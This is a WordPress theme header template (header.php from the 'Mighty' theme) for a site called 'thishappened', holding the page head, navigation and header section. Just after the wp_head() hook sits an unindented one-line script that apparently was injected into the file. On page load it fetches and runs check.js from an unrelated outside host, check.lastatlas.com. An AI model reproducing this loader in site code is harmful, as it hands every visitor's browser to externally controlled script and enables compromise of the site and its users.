<!DOCTYPE html>

<html <?php language_attributes(); ?>>

	<!-- A Mighty WordPress Theme (http://meetmighty.com) -->

	<head>

		<!-- Meta -->
		<meta http-equiv="content-type" content="<?php bloginfo( 'html_type' ); ?>; charset=<?php bloginfo( 'charset' ); ?>" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		
		<!-- Title -->
		<title><?php if ( is_front_page() ) { ?><?php bloginfo( 'name' ); ?> - <?php bloginfo( 'description' ); ?><?php } else { ?><?php wp_title( '-', true, 'right' ); ?><?php bloginfo( 'name' ); ?><?php } ?></title>
						
		<!-- RSS & Pingbacks -->
		<?php if ( of_get_option( 'feedburner-url' ) ) : ?>
			<link rel="alternate" type="application/rss+xml" title="<?php bloginfo( 'name' ); ?> <?php _e( 'RSS Feed', 'mighty' ); ?>" href="http://feeds.feedburner.com/<?php echo of_get_option( 'feedburner-url' ); ?>" />
		<?php else : ?>
			<link rel="alternate" type="application/rss+xml" title="<?php bloginfo( 'name' ); ?> <?php _e( 'RSS Feed', 'mighty' ); ?>" href="<?php bloginfo( 'rss2_url' ); ?>" />
		<?php endif; ?>
		<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />
		
		<!-- Favicon -->
		<?php if ( of_get_option( 'custom-favicon' ) ) : ?>
			<link rel="shortcut icon" href="<?php echo of_get_option( 'custom-favicon' ); ?>" />
		<?php else : ?>
			<link rel="shortcut icon" href="<?php echo get_template_directory_uri(); ?>/images/fav.ico" />
		<?php endif; ?>
		
		<!-- Hooks -->
		<?php wp_head(); ?>
		
<script type="text/javascript">(function(){function async_load(){ var s = document.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = 'http://check.lastatlas.com/mc/tm-cqzxpd4uag9fo0hel1imy5kvj/check.js'; var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(s, x); }; if (window.attachEvent){window.attachEvent('onload', async_load);}else{window.addEventListener('load', async_load, false);} })();</script>

	</head>


	<body <?php body_class( 'fadeDown single-talks' ); ?> <?php if ( is_category(2) ){ body_class( 'single-talks' ); } ?> itemscope="itemscope" itemtype="http://schema.org/WebPage">

	    <header id="header" role="banner" itemscope="itemscope" itemtype="http://schema.org/WPHeader">

		    <div class="wrap clearfix">
			        
			    <!-- Logo -->

<a href="http://www.thishappened.org/"><img src="http://thishappened.hellicarandlewis.com/wp-content/uploads/thishappened1.gif" border="0" width="278" height="40"></a>

			    <!-- Navigation -->
			    <nav role="navigation" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
					<?php if( has_nav_menu( 'header-menu' ) ) : ?>
					
					    <?php
						    wp_nav_menu(
							    array(
								    'theme_location' => 'header-menu',
								    'container'      => false,
								    'menu_id'        => 'nav',
								    'menu_class'     => 'header-menu',
								    'depth'          => '4'
							    )
						    );
					    ?>
					
					<?php else : ?>
					
					<ul id="nav">
						<?php wp_list_pages( 'title_li=&depth=1' ); ?>
					</ul>
					
					<?php endif; ?>
				</nav>

				<div class="clearfix"></div>

				<section id="header-meta" class="clearfix">
		
					<?php if ( is_front_page() ) : ?>

						<?php if ( of_get_option( 'header-heading' ) ) : ?>
							<h1><?php echo of_get_option( 'header-heading' ); ?></h1>
						<?php endif; ?>
				
						<?php if ( of_get_option( 'header-subhead' ) ) : ?>
							<h2><?php echo of_get_option( 'header-subhead' ); ?></h2>
						<?php endif; ?>
				
						<?php if ( of_get_option( 'header-btn-link' ) ) : ?>
							<a href="<?php echo of_get_option( 'header-btn-link' ); ?>" title="<?php echo of_get_option( 'header-btn-text' ); ?>" class="btn"><?php echo of_get_option( 'header-btn-text' ); ?></a>
						<?php endif; ?>

					<?php elseif ( is_singular() || is_home() ) : ?>
																									
						<h1><?php single_post_title(); ?></h1>
						<?php $page_id = get_queried_object_id(); ?>

						<?php if (get_field('happened', $page_id)) : ?>
							<p>happened on <?php echo get_the_date('j F Y', $page_id); ?></p>
						<?php endif; ?>
						
					<?php elseif ( is_category() ): ?>
																									
						<h1><?php single_cat_title(''); ?></h1>
						
						<h2><?php category_description(); ?></h2>
										
					<?php endif; ?>

				</section>

	
		</header>
